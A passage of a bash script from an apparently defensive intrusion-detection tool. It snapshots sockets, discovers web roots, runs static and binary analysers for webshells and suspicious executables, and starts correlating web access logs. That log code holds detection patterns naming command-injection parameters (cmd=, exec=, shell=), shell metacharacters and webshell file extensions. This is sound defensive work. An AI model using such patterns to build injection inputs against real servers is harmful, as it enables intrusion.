    STATIC_STAGE_TIMEOUT=$(((remaining + stages_left - 1) / stages_left))
    [ "$STATIC_STAGE_TIMEOUT" -ge 1 ] || STATIC_STAGE_TIMEOUT=1
}

collect_socket_snapshot_once() {
    SOCKET_SNAPSHOT_FILE="${RAW_DIR}/socket-snapshot.txt"
    SOCKET_ESTABLISHED_FILE="${RAW_DIR}/ss_established.txt"
    SOCKET_LISTEN_FILE="${RAW_DIR}/ss_listen.txt"
    SOCKET_LISTEN_TCP_FILE="${RAW_DIR}/.ss-listen-tcp.txt"
    SOCKET_LISTEN_UDP_FILE="${RAW_DIR}/.ss-listen-udp.txt"
    [ "$SOCKET_SNAPSHOT_STATUS" != NOT_RUN ] && return 0
    benchmark_stage_begin socket_snapshot
    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_SOCKET_SNAPSHOTS=$((BENCHMARK_SOCKET_SNAPSHOTS + 1))
    : > "${RAW_DIR}/socket-snapshot.error"
    local native_raw="${RAW_DIR}/runtime-snapshot-initial.jsonl" native_socket_tsv="${RAW_DIR}/socket-snapshot.tsv"
    if [ "$NATIVE_RUNTIME_READY" = true ] && [ "$NATIVE_RUNTIME_INITIAL_STATUS" = NOT_RUN ]; then
        if native_runtime_run initial "$native_raw" "${RAW_DIR}/process-context.tsv" "${RAW_DIR}/container-context.tsv" "${RAW_DIR}/native-executable-mappings-initial.tsv" "$SOCKET_SNAPSHOT_FILE" "$native_socket_tsv"; then
            native_runtime_record_status initial "$NATIVE_RUNTIME_LAST_STATUS" network "collector_status=${NATIVE_RUNTIME_LAST_STATUS}"
            if [ "$NATIVE_RUNTIME_LAST_STATUS" = PARTIAL ]; then
                SOCKET_SNAPSHOT_STATUS=PARTIAL
                mark_current_module_partial native_runtime_initial_partial
            else
                SOCKET_SNAPSHOT_STATUS=AVAILABLE
            fi
            record_raw_status 'socket-snapshot.txt' "$([ "$SOCKET_SNAPSHOT_STATUS" = PARTIAL ] && printf PARTIAL || printf SUCCESS)" network "native_runtime=${NATIVE_RUNTIME_LAST_STATUS}"
            record_raw_status 'socket-snapshot.tsv' "$([ "$SOCKET_SNAPSHOT_STATUS" = PARTIAL ] && printf PARTIAL || printf SUCCESS)" network "native_runtime=${NATIVE_RUNTIME_LAST_STATUS}"
            record_raw_status 'native-executable-mappings-initial.tsv' "$([ "$SOCKET_SNAPSHOT_STATUS" = PARTIAL ] && printf PARTIAL || printf SUCCESS)" process "native_runtime=${NATIVE_RUNTIME_LAST_STATUS}"
        else
            native_runtime_record_status initial PARTIAL network "native_runtime_exit_or_output_invalid=${NATIVE_RUNTIME_LAST_STATUS}"
            mark_current_module_partial native_runtime_initial_failed
        fi
    fi
    if [ "$SOCKET_SNAPSHOT_STATUS" = NOT_RUN ]; then
        if command -v ss >/dev/null 2>&1 && run_with_timeout 15 ss -Htanup > "$SOCKET_SNAPSHOT_FILE" 2> "${RAW_DIR}/socket-snapshot.error"; then
            SOCKET_SNAPSHOT_STATUS=AVAILABLE
            record_raw_status 'socket-snapshot.txt' SUCCESS network ''
        else
            SOCKET_SNAPSHOT_STATUS=UNAVAILABLE
            : > "$SOCKET_SNAPSHOT_FILE"
            record_raw_status 'socket-snapshot.txt' UNAVAILABLE network 'ss missing, timed out, or failed'
            mark_current_module_partial socket_snapshot_unavailable
        fi
    fi
    awk '$2=="ESTAB" || $2=="ESTABLISHED"' "$SOCKET_SNAPSHOT_FILE" > "$SOCKET_ESTABLISHED_FILE"
    awk '$2=="LISTEN" || $2=="UNCONN"' "$SOCKET_SNAPSHOT_FILE" > "$SOCKET_LISTEN_FILE"
    awk '$1=="tcp" && $2=="LISTEN"' "$SOCKET_SNAPSHOT_FILE" > "$SOCKET_LISTEN_TCP_FILE"
    awk '$1=="udp" && ($2=="UNCONN" || $2=="LISTEN")' "$SOCKET_SNAPSHOT_FILE" > "$SOCKET_LISTEN_UDP_FILE"
    chmod 600 "$SOCKET_SNAPSHOT_FILE" "$SOCKET_ESTABLISHED_FILE" "$SOCKET_LISTEN_FILE" "$SOCKET_LISTEN_TCP_FILE" "$SOCKET_LISTEN_UDP_FILE" "${RAW_DIR}/socket-snapshot.error" 2>/dev/null || true
    benchmark_stage_end socket_snapshot
}

socket_snapshot() {
    local mode="${1:-all}"
    collect_socket_snapshot_once
    case "$mode" in
        established) cat "$SOCKET_ESTABLISHED_FILE" ;;
        listen_tcp) cat "$SOCKET_LISTEN_TCP_FILE" ;;
        listen_udp) cat "$SOCKET_LISTEN_UDP_FILE" ;;
        listen) cat "$SOCKET_LISTEN_FILE" ;;
        *) cat "$SOCKET_SNAPSHOT_FILE" ;;
    esac
}


discover_web_roots() {
    local roots="${RAW_DIR}/static-roots.txt" path pid
    : > "$roots"
    printf '%s\n' /var/www /usr/share/nginx /usr/local/nginx/html /opt/www /srv/www /home /tmp /var/tmp /dev/shm \
        /var/lib/tomcat/webapps /var/cache/tomcat /var/lib/php /usr/lib/php /usr/local/lib/php >> "$roots"
    while IFS= read -r path; do [ -n "$path" ] && printf '%s\n' "$path"; done < <(printf '%s' "$FILE_SCAN_ROOTS" | tr ',' '\n') >> "$roots"
    # Extract only absolute paths from server/PHP configuration; variables and
    # unresolved templates are retained as coverage gaps instead of guessed.
    for path in /etc/nginx /etc/httpd /etc/apache2 /etc/caddy /etc/tomcat /etc/tomcat* /etc/php /etc/php-fpm.d /opt/tomcat/conf; do
        [ -d "$path" ] || continue
        LC_ALL=C grep -RhsE '^[[:space:]]*(root|DocumentRoot|appBase|doc_root|upload_tmp_dir|extension_dir|chroot)[[:space:]=]+' "$path" 2>/dev/null | \
            sed -E 's/^[^=[:space:]]+[[:space:]=]+//;s/[;"]//g;s/[[:space:]].*$//' | tr -d "'" >> "$roots"
    done
    for pid in /proc/[0-9]*; do
        [ -r "$pid/comm" ] || continue
        case "$(cat "$pid/comm" 2>/dev/null)" in nginx|apache2|httpd|caddy|java|php-fpm|php-cgi|dotnet|node) ;;
            *) continue ;;
        esac
        readlink -f "$pid/cwd" 2>/dev/null >> "$roots" || true
    done
    LC_ALL=C awk 'substr($0,1,1)=="/" && !seen[$0]++ {print}' "$roots" | while IFS= read -r path; do
        [ -d "$path" ] && [ ! -L "$path" ] && printf '%s\n' "$path"
    done > "${roots}.valid"
    mv "${roots}.valid" "$roots"; chmod 600 "$roots"
    record_raw_status 'static-roots.txt' "$([ -s "$roots" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
}

append_runtime_binary_candidates() {
    # Add running executables and mapped ELF objects without following links.
    # The final de-duplication remains bounded so a large JVM/container map set
    # cannot starve Web roots selected by the fair discovery helper.
    local runtime="${RAW_DIR}/runtime-binary-candidates.txt" changed="${RAW_DIR}/changed-static-candidates.txt" pid path total runtime_limit changed_limit
    : > "$runtime"
    for pid in /proc/[0-9]*; do
        [ -r "$pid/stat" ] || continue
        path=$(readlink -f "$pid/exe" 2>/dev/null || true)
        [ -n "$path" ] && [ -f "$path" ] && [ ! -L "$path" ] && printf '%s\n' "$path" >> "$runtime"
        [ -r "$pid/maps" ] || continue
        awk 'NF>=6 && $2 ~ /x/ {p=$NF; if (substr(p,1,1)=="/" && p !~ /[(]deleted[)]$/) print p}' "$pid/maps" 2>/dev/null >> "$runtime"
    done
    runtime_limit=$((STATIC_MAX_FILES / 4)); [ "$runtime_limit" -ge 1 ] || runtime_limit=1; [ "$runtime_limit" -le 400 ] || runtime_limit=400
    LC_ALL=C awk '!seen[$0]++' "$runtime" | head -n "$runtime_limit" > "${runtime}.dedup"
    mv "${runtime}.dedup" "$runtime"
    changed_limit=$((STATIC_MAX_FILES / 4)); [ "$changed_limit" -ge 1 ] || changed_limit=1
    if [ -s "${RAW_DIR}/file-changes.tsv" ]; then
        awk -F '\t' '($1=="ADDED" || $1=="MODIFIED" || $1=="MOVED") && $2!="" && !seen[$2]++ {print $2}' \
            "${RAW_DIR}/file-changes.tsv" | head -n "$changed_limit" > "$changed"
    else
        : > "$changed"
    fi
    if [ -s "$STATIC_CANDIDATE_FILE" ]; then
        # Changed files and active mappings each receive a bounded reservation;
        # fair root discovery retains the remaining budget.
        { cat "$changed"; cat "$runtime"; cat "$STATIC_CANDIDATE_FILE"; } | LC_ALL=C awk '!seen[$0]++' | head -n "$STATIC_MAX_FILES" > "${STATIC_CANDIDATE_FILE}.merged"
        mv "${STATIC_CANDIDATE_FILE}.merged" "$STATIC_CANDIDATE_FILE"
    else { cat "$changed"; cat "$runtime"; } | LC_ALL=C awk '!seen[$0]++' > "$STATIC_CANDIDATE_FILE"; fi
    total=$(wc -l < "$runtime" | tr -d ' ')
    printf '{"root":"runtime_mapped_binaries","status":"%s","selected":%d,"limit":%d,"reason":"running executables and executable file-backed maps"}\n' \
        "$([ "${total:-0}" -ge "$runtime_limit" ] && printf PARTIAL || printf COMPLETE)" "${total:-0}" "$runtime_limit" >> "$STATIC_COVERAGE_FILE"
    chmod 600 "$runtime" "$changed" "$STATIC_CANDIDATE_FILE" "$STATIC_COVERAGE_FILE" 2>/dev/null || true
}

build_static_candidate_list() {
    local roots="${RAW_DIR}/static-roots.txt" summary="${RAW_DIR}/static-discovery-summary.json" stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}"
    STATIC_CANDIDATE_FILE="${RAW_DIR}/static-candidates.txt"
    STATIC_COVERAGE_FILE="${RAW_DIR}/static-coverage.jsonl"
    STATIC_CANDIDATE_STATUS=NOT_RUN
    if [ "$SCAN_PROFILE" = corpus-validation ]; then
        local corpus_rc=0
        python3 "$CORPUS_MANIFEST_HELPER" --manifest "$CORPUS_MANIFEST_FILE" --root "$CORPUS_ROOT" \
            --output-list "$STATIC_CANDIDATE_FILE" --coverage-jsonl "$STATIC_COVERAGE_FILE" \
            --summary "$summary" --max-files "$STATIC_MAX_FILES" > "${RAW_DIR}/corpus-manifest-helper.log" 2>&1 || corpus_rc=$?
        chmod 600 "$STATIC_CANDIDATE_FILE" "$STATIC_COVERAGE_FILE" "$summary" "${RAW_DIR}/corpus-manifest-helper.log" 2>/dev/null || true
        CORPUS_VALIDATION_STATUS=$(python3 - "$summary" <<'PY' 2>/dev/null || printf INCONCLUSIVE
import json, sys
print(json.load(open(sys.argv[1], encoding="utf-8")).get("status", "INCONCLUSIVE"))
PY
        )
        case "$CORPUS_VALIDATION_STATUS:$corpus_rc" in
            SUCCESS:0)
                STATIC_CANDIDATE_STATUS=AVAILABLE
                record_raw_status 'static-candidates.txt' SUCCESS filesystem ''
                record_raw_status 'static-coverage.jsonl' SUCCESS filesystem ''
                record_raw_status 'static-discovery-summary.json' SUCCESS filesystem ''
                ;;
            INCONCLUSIVE:*)
                STATIC_CANDIDATE_STATUS=PARTIAL
                record_raw_status 'static-candidates.txt' PARTIAL filesystem 'corpus_manifest_inconclusive'
                record_raw_status 'static-coverage.jsonl' PARTIAL filesystem 'corpus_manifest_inconclusive'
                record_raw_status 'static-discovery-summary.json' PARTIAL filesystem 'corpus_manifest_inconclusive'
                mark_current_module_partial corpus_manifest_inconclusive
                ;;
            *)
                STATIC_CANDIDATE_STATUS=PARTIAL
                record_raw_status 'static-candidates.txt' PARTIAL filesystem 'corpus_manifest_partial'
                record_raw_status 'static-coverage.jsonl' PARTIAL filesystem 'corpus_manifest_partial'
                record_raw_status 'static-discovery-summary.json' PARTIAL filesystem 'corpus_manifest_partial'
                mark_current_module_partial corpus_manifest_partial
                ;;
        esac
        record_raw_status 'corpus-manifest-helper.log' "$([ "$corpus_rc" -eq 0 ] && printf SUCCESS || printf PARTIAL)" filesystem "exit=${corpus_rc}"
        return 0
    fi
    discover_web_roots
    if [ ! -x "$NATIVE_SCANNER_PATH" ]; then
        : > "$STATIC_CANDIDATE_FILE"; : > "$STATIC_COVERAGE_FILE"
        printf '{"status":"UNAVAILABLE","error":"native candidate discovery missing"}\n' > "$summary"
        record_raw_status 'static-candidates.txt' UNAVAILABLE filesystem 'native candidate discovery unavailable'
        record_raw_status 'static-coverage.jsonl' UNAVAILABLE filesystem 'native candidate discovery unavailable'
        mark_current_module_partial static_candidate_discovery_unavailable
        STATIC_CANDIDATE_STATUS=UNAVAILABLE
        return 1
    fi
    run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" discover-candidates \
        --roots-file "$roots" --output-list "$STATIC_CANDIDATE_FILE" --coverage-jsonl "$STATIC_COVERAGE_FILE" \
        --max-files "$STATIC_MAX_FILES" --root-quota "$STATIC_ROOT_QUOTA" --max-depth 10 \
        --exclude-prefix "$PROGRAM_DIR" --exclude-prefix "$REPORT_ROOT" --exclude-prefix "$STATE_DIR" --exclude-prefix "$OUTPUT_DIR" \
        --timeout-seconds "$stage_timeout" > "$summary" 2>&1
    local rc=$?
    chmod 600 "$STATIC_CANDIDATE_FILE" "$STATIC_COVERAGE_FILE" "$summary" 2>/dev/null || true
    if [ "$rc" -eq 0 ]; then
        STATIC_CANDIDATE_STATUS=AVAILABLE
        record_raw_status 'static-candidates.txt' SUCCESS filesystem ''
        if grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"|"timed_out"[[:space:]]*:[[:space:]]*true|"status"[[:space:]]*:[[:space:]]*"NOT_STARTED' "$STATIC_COVERAGE_FILE"; then
            record_raw_status 'static-coverage.jsonl' PARTIAL filesystem 'root/depth/time/quota limit reached'
            mark_current_module_partial static_coverage_limited
        else record_raw_status 'static-coverage.jsonl' SUCCESS filesystem ''; fi
    else
        STATIC_CANDIDATE_STATUS=PARTIAL
        record_raw_status 'static-candidates.txt' PARTIAL filesystem "discovery_exit_${rc}"
        record_raw_status 'static-coverage.jsonl' PARTIAL filesystem "discovery_exit_${rc}"
        mark_current_module_partial "static_discovery_exit_${rc}"
    fi
    append_runtime_binary_candidates
}


run_static_language_adapters() {
    local candidate_file="${1:-$STATIC_CANDIDATE_FILE}"
    local out="${RAW_DIR}/static-analysis.jsonl" summary="${RAW_DIR}/static-analysis-summary.json" projection="${RAW_DIR}/static-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}" expected_count=0 scanned_count=0
    if [ "$stage_timeout" -le 0 ]; then
        printf '{"detector":"secscope-bounded-static","status":"PARTIAL","timeout":true,"scanned_files":0,"reason":"shared_pipeline_budget_exhausted"}\n' > "$out"
        cp "$out" "$summary"; : > "$projection"
        record_raw_status 'static-analysis.jsonl' PARTIAL filesystem 'shared_pipeline_budget_exhausted'
        mark_current_module_partial static_pipeline_budget_exhausted_before_language_analysis
        return 0
    fi
    if [ ! -x "$NATIVE_SCANNER_PATH" ]; then
        printf '{"detector":"secscope-bounded-static","status":"UNAVAILABLE","visibility_gaps":["native_static_analyzer_missing"]}\n' > "$out"
        record_raw_status 'static-analysis.jsonl' UNAVAILABLE filesystem 'native static analyzer missing'
        mark_current_module_partial static_language_adapters_unavailable
        return 0
    fi
    run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" analyze-static --input-list "$candidate_file" \
        --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
        --max-bytes 4194304 --max-decode-depth 3 --max-decoded-bytes 4194304 \
        --max-archive-members 200 --max-archive-bytes 33554432 --max-compression-ratio 50 > "$summary" 2>&1 || rc=$?
    chmod 600 "$out" "$summary" 2>/dev/null || true
    grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary" && native_status=PARTIAL || true
    expected_count=$(wc -l < "$candidate_file" | tr -d ' ')
    scanned_count=$(python3 - "$summary" <<'PY' 2>/dev/null || printf 0
import json, sys
print(int(json.load(open(sys.argv[1], encoding="utf-8")).get("scanned_files", 0) or 0))
PY
    )
    if [ "${scanned_count:-0}" -ne "${expected_count:-0}" ]; then
        native_status=PARTIAL
        mark_current_module_partial "static_analyzer_incomplete_expected_${expected_count}_scanned_${scanned_count}"
    fi
    if [ "$rc" -eq 0 ] && [ "$native_status" = SUCCESS ]; then
        record_raw_status 'static-analysis.jsonl' SUCCESS filesystem ''
    else
        record_raw_status 'static-analysis.jsonl' PARTIAL filesystem "$([ "$rc" -ne 0 ] && printf 'adapter_exit_%s' "$rc" || printf 'native_summary_partial')"
        mark_current_module_partial "$([ "$rc" -ne 0 ] && printf 'static_adapter_exit_%s' "$rc" || printf 'static_adapter_summary_partial')"
    fi
    # Results are structural evidence.  Even HIGH_RISK_STRUCTURE is not an
    # automatic malware verdict without a second independent event/data source.
    if [ -r "$projection" ]; then
        while IFS=$'\t' read -r path language classification score sha capabilities edges counter; do
            [ -n "$path" ] || continue
            [ "$classification" != OBSERVE ] || continue
            record_find "$([ "$classification" = HIGH_RISK_STRUCTURE ] && printf HIGH || printf MEDIUM)" webshell \
                "${language} 高风险能力结构: $path" \
                "classification=$classification; score=$score; sha256=$sha; capabilities=$capabilities; causal_edges=$edges" \
                '与文件基线、HTTP、写入进程、执行和网络事件按实体关联；不执行目标代码' 'T1505.003' \
                'STATIC-BOUNDED-DEOBFUSCATION' "$path" 'static-analysis.jsonl,static-coverage.jsonl' 'SECURITY_ANOMALY' MEDIUM \
                '有界解码后发现多能力数据流结构，仅为文件静态数据源' \
                '需同实体的独立运行时、HTTP、写入或网络证据才能升级' 'FILE' \
                "counter_evidence=${counter:-none}; adapter never loads or executes target" \
                "$RUN_STARTED_AT|FILE|$classification $path"
        done < <(tail -n +2 "$projection")
    fi
}

run_binary_analyzers() {
    local candidate_file="${1:-$STATIC_CANDIDATE_FILE}"
    local out="${RAW_DIR}/binary-analysis.jsonl" summary="${RAW_DIR}/binary-analysis-summary.json" enriched="${RAW_DIR}/binary-analysis-enriched.tsv" projection="${RAW_DIR}/binary-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}"
    if [ "$stage_timeout" -le 0 ]; then
        printf '{"detector":"SecScope.BinaryAnalyzer","status":"PARTIAL","scanned":0,"reason":"shared_pipeline_budget_exhausted"}\n' > "$out"
        cp "$out" "$summary"; : > "$projection"
        printf 'file_path\tformat\tsha256\tmd5\tpackage_owner\tsignature_status\trisk_score\tapi_combinations\tstructural_anomalies\n' > "$enriched"
        record_raw_status 'binary-analysis.jsonl' PARTIAL filesystem 'shared_pipeline_budget_exhausted'
        record_raw_status 'binary-analysis-enriched.tsv' PARTIAL filesystem 'shared_pipeline_budget_exhausted'
        mark_current_module_partial static_pipeline_budget_exhausted_before_binary_analysis
        return 0
    fi
    if [ ! -x "$NATIVE_SCANNER_PATH" ]; then
        printf '{"detector":"SecScope.BinaryAnalyzer","status":"UNAVAILABLE","visibility_gaps":["native_binary_analyzer_missing"]}\n' > "$out"
        record_raw_status 'binary-analysis.jsonl' UNAVAILABLE filesystem 'native PE/ELF analyzer unavailable'
        mark_current_module_partial binary_analyzer_unavailable
        return 0
    fi
    run_with_timeout "$((stage_timeout + 2))" "$NATIVE_SCANNER_PATH" analyze-binary --input-list "$candidate_file" \
        --output-jsonl "$out" --projection-tsv "$projection" --max-files "$YARA_MAX_FILES" --max-bytes 33554432 --timeout-seconds "$stage_timeout" > "$summary" 2>&1 || rc=$?
    printf 'file_path\tformat\tsha256\tmd5\tpackage_owner\tsignature_status\trisk_score\tapi_combinations\tstructural_anomalies\n' > "$enriched"
    while IFS=$'\t' read -r path format sha md5 signature score combos anomalies; do
        [ -n "$path" ] || continue
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$format" "$sha" "$md5" "$(file_package_owner "$path")" "$signature" "$score" "$combos" "$anomalies" >> "$enriched"
        [ "${score:-0}" -ge 20 ] || continue
        record_find MEDIUM rat "可执行文件静态行为组合待研判: $path" \
            "format=$format; sha256=$sha; md5=$md5; risk_score=$score; api_combinations=$combos; anomalies=$anomalies" \
            '关联同一进程实例的执行、网络、注入与持久化；静态 API/熵/路径不单独定性' 'T1027' \
            'RAT-BINARY-STRUCTURE' "$path" 'binary-analysis.jsonl,binary-analysis-enriched.tsv' 'SECURITY_ANOMALY' LOW \
            '纯字节解析发现高风险 API 组合或多个结构异常，未执行目标文件' \
            '同实体出现公网周期通信、注入、持久化或确认恶意哈希时升级' 'FILE' \
            '无签名、高熵、临时路径和加壳均被限制为弱证据' "$RUN_STARTED_AT|FILE|binary metadata score=$score"
    done < <(tail -n +2 "$projection")
    chmod 600 "$out" "$summary" "$enriched" 2>/dev/null || true
    grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$summary" && native_status=PARTIAL || true
    if [ "$rc" -eq 0 ] && [ "$native_status" = SUCCESS ]; then
        record_raw_status 'binary-analysis.jsonl' SUCCESS filesystem ''
        record_raw_status 'binary-analysis-enriched.tsv' SUCCESS filesystem ''
    else
        record_raw_status 'binary-analysis.jsonl' PARTIAL filesystem "$([ "$rc" -ne 0 ] && printf 'binary_analyzer_exit_%s' "$rc" || printf 'native_summary_partial')"
        record_raw_status 'binary-analysis-enriched.tsv' PARTIAL filesystem 'binary analyzer summary partial'
        mark_current_module_partial "$([ "$rc" -ne 0 ] && printf 'binary_analyzer_exit_%s' "$rc" || printf 'binary_analyzer_summary_partial')"
    fi
}

route_static_candidates() {
    local summary="${RAW_DIR}/static-routing-summary.json" rc=0 candidate_count=0 route_status=SUCCESS
    STATIC_WEB_CANDIDATE_FILE="${RAW_DIR}/static-web-candidates.txt"
    STATIC_BINARY_CANDIDATE_FILE="${RAW_DIR}/static-binary-candidates.txt"
    STATIC_YARA_CANDIDATE_FILE="${RAW_DIR}/static-yara-candidates.txt"
    candidate_count=$(wc -l < "$STATIC_CANDIDATE_FILE" 2>/dev/null | tr -d ' '); candidate_count=${candidate_count:-0}
    if command -v python3 >/dev/null 2>&1 && [ -r "$STATIC_ROUTER_PATH" ]; then
        run_with_timeout 30 python3 "$STATIC_ROUTER_PATH" --input-list "$STATIC_CANDIDATE_FILE" \
            --web-output "$STATIC_WEB_CANDIDATE_FILE" --binary-output "$STATIC_BINARY_CANDIDATE_FILE" \
            --yara-output "$STATIC_YARA_CANDIDATE_FILE" --summary "$summary" > "${RAW_DIR}/static-routing.log" 2>&1 || rc=$?
    else
        rc=125
    fi
    if [ "$rc" -ne 0 ] && [ "$rc" -ne 2 ]; then
        route_status=PARTIAL
        cp "$STATIC_CANDIDATE_FILE" "$STATIC_WEB_CANDIDATE_FILE"
        cp "$STATIC_CANDIDATE_FILE" "$STATIC_BINARY_CANDIDATE_FILE"
        cp "$STATIC_CANDIDATE_FILE" "$STATIC_YARA_CANDIDATE_FILE"
        printf '{"schema_version":1,"router":"fallback-all","status":"PARTIAL","input_candidates":%d,"web_candidates":%d,"binary_candidates":%d,"yara_candidates":%d,"reason":"router_exit_%d"}\n' \
            "$candidate_count" "$candidate_count" "$candidate_count" "$candidate_count" "$rc" > "$summary"
        mark_current_module_partial "static_router_fallback_exit_${rc}"
    elif [ "$rc" -eq 2 ]; then
        route_status=PARTIAL
        mark_current_module_partial static_router_unreadable_or_unstable_candidates
    fi
    chmod 600 "$STATIC_WEB_CANDIDATE_FILE" "$STATIC_BINARY_CANDIDATE_FILE" "$STATIC_YARA_CANDIDATE_FILE" "$summary" "${RAW_DIR}/static-routing.log" 2>/dev/null || true
    record_raw_status 'static-routing-summary.json' "$route_status" filesystem "router_exit=${rc};high_recall_yara_lane=true"
    record_raw_status 'static-web-candidates.txt' "$route_status" filesystem 'L1 text/archive/web routing'
    record_raw_status 'static-binary-candidates.txt' "$route_status" filesystem 'L1 ELF/PE magic routing'
    record_raw_status 'static-yara-candidates.txt' "$route_status" yara 'all readable regular candidates'
}

scan_web_static_structures() {
    local out="${RAW_DIR}/web-static-analysis.tsv" path result score reasons entropy long_line hash owner count=0 projection_hash
    declare -A static_hash_by_path=()
    printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "$out"
    # Static discovery, YARA, language analysis, binary analysis and shell
    # scoring share one profile budget. Full must not multiply its 300-second
    # constrained-host budget across every sub-stage.
    STATIC_PIPELINE_DEADLINE=$((SECONDS + YARA_TOTAL_TIMEOUT))
    static_pipeline_stage_budget 5 || true
    build_static_candidate_list || true
    route_static_candidates
    static_pipeline_stage_budget 4 || true
    scan_yara_candidates "$STATIC_YARA_CANDIDATE_FILE"
    static_pipeline_stage_budget 3 || true
    run_static_language_adapters "$STATIC_WEB_CANDIDATE_FILE"
    static_pipeline_stage_budget 2 || true
    run_binary_analyzers "$STATIC_BINARY_CANDIDATE_FILE"
    static_pipeline_stage_budget 1 || true
    if [ -r "${RAW_DIR}/static-analysis-projection.tsv" ]; then
        while IFS=$'\t' read -r path _ _ _ projection_hash _; do [ -n "$path" ] && [ -n "$projection_hash" ] && static_hash_by_path["$path"]="$projection_hash"; done < <(tail -n +2 "${RAW_DIR}/static-analysis-projection.tsv")
    fi
    if [ -r "${RAW_DIR}/binary-analysis-projection.tsv" ]; then
        while IFS=$'\t' read -r path _ projection_hash _; do
            [ -n "$path" ] && [ -n "$projection_hash" ] || continue
            [ -n "${static_hash_by_path[$path]:-}" ] || static_hash_by_path["$path"]="$projection_hash"
        done < <(tail -n +2 "${RAW_DIR}/binary-analysis-projection.tsv")
    fi
    if [ -s "$STATIC_WEB_CANDIDATE_FILE" ]; then
        while IFS= read -r path; do
            if [ "$STATIC_PIPELINE_DEADLINE" -gt 0 ] && [ "$SECONDS" -ge "$STATIC_PIPELINE_DEADLINE" ]; then
                mark_current_module_partial static_pipeline_budget_exhausted_before_shell_scoring
                break
            fi
            result=$(web_static_structure_score "$path"); IFS=$'\t' read -r score reasons entropy long_line <<< "$result"
            [ "$score" -gt 0 ] || { count=$((count + 1)); continue; }
            hash="${static_hash_by_path[$path]:-}"; [ -n "$hash" ] || hash=$(sha256_file "$path" 2>/dev/null || true)
            owner=$(file_package_owner "$path")
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$score" "$reasons" "$entropy" "$long_line" "$hash" "${owner:-unowned}" "independent:yara-results.jsonl" >> "$out"
            if [ "$score" -ge 4 ]; then
                record_find MEDIUM webshell "Web 文件静态结构异常: $path" \
                    "score=${score}; structures=${reasons}; entropy=${entropy}; long_line=${long_line}; sha256=${hash}; package=${owner:-unowned}; yara=independent" \
                    '与文件基线、HTTP 访问、Web 进程执行和网络行为关联；静态结构本身不判定 WebShell' 'T1505.003' \
                    'WEB-STATIC-STRUCTURE' "$path" 'web-static-analysis.tsv,file-inventory-current.tsv' 'SECURITY_ANOMALY' MEDIUM \
                    '命中多层解码、动态函数构造、反射或解码后执行结构；高熵与长行只作为辅助' \
                    '若文件为基线新增/修改并被请求、执行，随后派生 Shell 或外连，应升级' 'WEB,FILE,INTEGRITY' \
                    "反证：包归属=${owner:-unowned}，YARA 结果独立保存，维护窗口=${MAINTENANCE_ACTIVE}" \
                    "$RUN_STARTED_AT|FILE|static structure score=$score path=$path"
            fi
            count=$((count + 1))
        done < "$STATIC_WEB_CANDIDATE_FILE"
    fi
    STATIC_PIPELINE_DEADLINE=0; STATIC_STAGE_TIMEOUT=0
    record_raw_status 'web-static-analysis.tsv' SUCCESS filesystem ''
}

correlate_web_attack_chain() {
    local changes="" post_static="" child_line pid starttime starttime_after exe instance network="" public_network="" conn peer peer_ip persistence="" domains title timeline evidence edge_file context_file
    local log_time source_file client_ip method uri status bytes host agent referer parse_status raw_hash uri_path uri_lower reason file_match base web_context_count=0
    collect_web_access_logs
    edge_file="${RAW_DIR}/web-causal-edges.tsv"; context_file="${RAW_DIR}/web-context-evidence.tsv"
    printf 'from_entity\tto_entity\trelation\ttimestamp_utc\tsource\tconfidence\n' > "$edge_file"
    printf 'web_entity\tlog_time\tclient_ip\turi\tevidence\tpid_binding\n' > "$context_file"
    [ -r "${RAW_DIR}/file-changes.tsv" ] && changes=$(grep -E $'\t(/var/www|/usr/share/nginx|/usr/local/nginx|/opt/www|/srv/www|/home/.+/(www|html))/' "${RAW_DIR}/file-changes.tsv" 2>/dev/null | head -20)
    # Access logs generally have no PID.  Preserve them as web-entity context;
    # never attach ProcessGuid/process_instance_id merely because a URI or a
    # filename resembles another event.
    if [ -r "${RAW_DIR}/web-access-normalized.tsv" ]; then
        while IFS=$'\t' read -r log_time source_file client_ip method uri status bytes host agent referer parse_status raw_hash; do
            [ "$log_time" = timestamp ] && continue
            reason=""; file_match=""; uri_path="${uri%%\?*}"; uri_lower=$(printf '%s' "$uri" | tr '[:upper:]' '[:lower:]')
            if [ "$method" = POST ] && [[ "$uri_path" =~ [.](css|js|jpg|jpeg|png|gif|ico|svg|txt|woff2?)$ ]]; then
                reason="${reason}${reason:+,}POST_STATIC_RESOURCE"
            fi
            [[ "$uri_path" =~ [.](php[3457]|phtml|phar|jsp|jspx|asp|aspx|ashx|cgi|pl)(/|$) ]] && reason="${reason}${reason:+,}WEBSHELL_RISK_EXTENSION"
            [[ "$uri_path" =~ [.](bak|old|orig|save|swp|tmp|inc|config|conf|sql|zip|tar|gz)(/|$) ]] && reason="${reason}${reason:+,}ABNORMAL_EXTENSION"
            [[ "$uri_lower" =~ (^|[?&])(cmd|exec|command|shell|system|passthru|ping|host|query)= ]] && reason="${reason}${reason:+,}COMMAND_PARAMETER"
            [[ "$uri_lower" == *'%3b'* || "$uri_lower" == *'%7c'* || "$uri_lower" == *'%26%26'* || "$uri_lower" == *'$('* || "$uri_lower" == *'%60'* ]] && reason="${reason}${reason:+,}COMMAND_METACHARACTER"
            [[ "$uri" == *';'* || "$uri" == *'|'* || "$uri" == *'&&'* || "$uri" == *'`'* ]] && reason="${reason}${reason:+,}COMMAND_METACHARACTER"
            base="${uri_path##*/}"
            if [ -n "$base" ] && [ -r "${RAW_DIR}/file-changes.tsv" ]; then
